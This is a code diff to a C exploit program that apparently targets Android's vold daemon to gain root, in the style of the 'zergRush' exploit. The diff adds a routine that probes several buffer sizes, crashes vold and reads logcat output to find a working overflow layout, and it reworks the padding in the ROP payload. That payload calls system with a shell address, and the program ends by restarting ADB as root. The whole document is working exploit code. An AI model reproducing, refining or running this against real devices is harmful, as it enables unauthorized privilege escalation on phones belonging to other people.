@@ -51,6 +51,8 @@ uint32_t stack_pivot = 0x41414141;
 uint32_t pop_r0 = 0x41414141;
 uint32_t jumpsz = 0;
 uint32_t gadget_jumpsz = 108;
+uint32_t buffsz = 0;
+uint32_t allbuffsz[] = {16,24,0};
 
 extern char **environ;
 
@@ -165,13 +167,17 @@ static int do_fault()
 	char s_stack_addr[5], s_stack_pivot_addr[5], s_pop_r0_addr[5], s_system[5], s_bsh_addr[5], s_heap_addr[5];
 	uint32_t bsh_addr;
 	char padding[128];
-	uint32_t padding_sz = (jumpsz == 0 ? 0 : gadget_jumpsz - jumpsz);
+	int32_t padding_sz = (jumpsz == 0 ? 0 : gadget_jumpsz - jumpsz);
 
 	memset(padding, 0, 128);
-
-	if(padding_sz) {
-		memset(padding, 'Z', padding_sz);
+	strcpy(padding, "LORDZZZZzzzz");
+	if(padding_sz > 0) {
+		memset(padding+12, 'Z', padding_sz);
 		printf("[*] Poping %d more zerglings\n", padding_sz);
+	}
+	else if(padding_sz < 0) {
+		memset(padding, 0, 128);
+		memset(padding, 'Z', 12+padding_sz);
 	}
 
 	if ((sock = socket_local_client("vold", ANDROID_SOCKET_NAMESPACE_RESERVED, SOCK_STREAM)) < 0)
@@ -186,7 +192,7 @@ static int do_fault()
 	strcpy(buf, "ZERG");
 	strcat(buf, " ZZ ");
 	strcat(buf, s_stack_pivot_addr);
-	for(i=3; i < 17; i++)
+	for(i=3; i < buffsz+1; i++)
 		strcat(buf, " ZZZZ");
 	strcat(buf, " ");
 	strcat(buf, s_heap_addr);
@@ -201,7 +207,7 @@ static int do_fault()
 
 	sprintf(s_bsh_addr, "%c%c%c%c", bsh_addr & 0xff, (bsh_addr>>8)&0xff, (bsh_addr>>16)&0xff, (bsh_addr>>24)&0xff);
 
-	n += sprintf(buf+n+1, "%s%s OVERLORDZZZZzzzz%s%s%s%sZZZZ%s%c", s_stack_addr, s_heap_addr, padding, s_pop_r0_addr, s_bsh_addr, s_system, bsh, 0);
+	n += sprintf(buf+n+1, "%s%s OVER%s%s%s%sZZZZ%s%c", s_stack_addr, s_heap_addr, padding, s_pop_r0_addr, s_bsh_addr, s_system, bsh, 0);
 	
 	printf("[*] Sending %d zerglings ...\n", n);
 
@@ -275,6 +281,46 @@ static int find_rop_gadgets()
 }
 
 
+static uint32_t checkcrash()
+{
+	uint32_t fault_addr = 0;
+	char buf[1024], *ptr = NULL;
+	FILE *f = NULL;
+	long pos = 0;
+	uint32_t sp=0, over=0;
+
+	system("/system/bin/logcat -c");
+	unlink(crashlog);
+
+	if ((logcat_pid = fork()) == 0) {
+		char *a[] = {"/system/bin/logcat",  "-f", crashlog, NULL};
+		execve(*a, a, environ);
+		exit(1);
+	}
+	sleep(3);
+
+	if (do_fault() < 0)
+		die("[-] Zerglings did not cause crash");
+	/* Give logcat time to write to file
+	 */
+	sleep(3);
+	if ((f = fopen(crashlog, "r")) == NULL)
+		die("[-] Zerglings did not leave stuff at all");
+	fseek(f, pos, SEEK_SET);
+	do {
+		memset(buf, 0, sizeof(buf));
+		if (!fgets(buf, sizeof(buf), f))
+			break;
+		if ((ptr = strstr(buf, "  sp ")) != NULL && !sp)
+			return 1;
+	} while (!feof(f));
+	pos = ftell(f);
+	fclose(f);
+
+	return 0;
+}
+
+
 static uint32_t find_stack_addr()
 {
 	uint32_t fault_addr = 0;
@@ -299,7 +345,7 @@ static uint32_t find_stack_addr()
 	 */
 	sleep(3);
 	if ((f = fopen(crashlog, "r")) == NULL)
-		die("[-] Zerglings did not leave interesting stuff");
+		die("[-] Zerglings did not leave stuff at all");
 	fseek(f, pos, SEEK_SET);
 	do {
 		memset(buf, 0, sizeof(buf));
@@ -381,6 +427,21 @@ int main(int argc, char **argv, char **env)
 		exit(-1);
 	}
 
+	tries = 0;
+	printf("[*] Scooting ...\n");
+	while(buffsz=allbuffsz[tries]) {
+		if(checkcrash()) {
+			printf("[+] Zerglings found a way to enter ! 0x%02x\n", buffsz);
+			break;
+		}
+		tries++;
+	}
+
+	if(!buffsz) {
+		printf("[-] Hellions with BLUE flames !\n");
+		exit(-1);
+	}
+
 	for (tries = 0; tries < 5; tries++) {
 		find_stack_addr();
 
@@ -457,7 +518,7 @@ int main(int argc, char **argv, char **env)
 		property_get("ro.kernel.qemu",qemuprop,"0");
 
 		if (qemuprop[0]=='1') {
-			printf("[+] Killing ADB and restarting as root..enjoy!\n");
+			printf("[+] Killing ADB and restarting as root... enjoy!\n");
 			fflush(stdout);
 			sleep(1);
 			kill(-1,SIGTERM);
